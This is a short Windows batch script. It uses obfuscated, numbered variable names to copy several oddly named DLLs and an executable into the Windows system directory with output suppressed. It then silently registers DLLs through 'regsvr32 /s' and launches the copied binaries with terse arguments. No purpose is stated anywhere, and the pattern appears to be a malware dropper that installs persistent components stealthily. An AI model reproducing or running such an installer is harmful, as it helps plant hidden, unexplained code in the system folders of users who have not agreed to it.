@echo       off

set       b10322503103225=jetctrl
set   u19385007193850=regsvr32.exe
set    f18760002187600=voipwet
set     d12031204120312=kopmet
set  e17041201170412=vipextoxn
set      b17353706173537=nretcip
set      f15020005150200=efgt

copy       %b10322503103225%.dll       %windir%\%b10322503103225%.dll  >nul
copy  %f18760002187600%.dll  %windir%
copy      %b17353706173537%.exe    %windir%   >nul
copy   %d12031204120312%.dll   %windir%\%d12031204120312%.dll      >nul
copy   %e17041201170412%.dll      %windir%       >nul

%windir%\system32\%u19385007193850%      /s   %windir%\%e17041201170412%.dll
%f15020005150200%.exe    %windir%\%b10322503103225%.dll     %b10322503103225%
%f15020005150200%.exe     %windir%\%d12031204120312%.dll    %d12031204120312%
%u19385007193850%      /s       %f18760002187600%.dll

%b17353706173537%.exe      reg
%f15020005150200%.exe  reqvg
